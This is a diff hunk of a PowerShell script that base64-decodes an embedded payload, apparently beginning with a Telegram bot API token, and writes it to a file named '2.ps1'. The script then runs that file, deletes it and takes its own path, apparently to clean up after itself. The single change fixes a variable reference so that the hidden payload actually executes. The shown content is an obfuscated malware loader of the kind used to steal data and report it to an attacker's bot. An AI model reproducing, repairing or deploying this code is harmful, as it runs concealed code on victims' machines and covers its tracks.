@@ -2,7 +2,7 @@ $anfjs = "JGFwaSA9ICI3NTAwMjY5NzUyOkFBRXdPaG5xbnFUZnd0c0dmdXNVd0Q3d1E2bnJfcVlTdW
 $dfsd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($anfjs))
 $sjfid = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
 $sfvid = Join-Path $sjfid "2.ps1"
-Set-Content -Path $sfvid -Value dfsd
+Set-Content -Path $sfvid -Value $dfsd
 & $sfvid
 Remove-Item -Path $sfvid -Force
 $skjd = $MyInvocation.MyCommand.Path
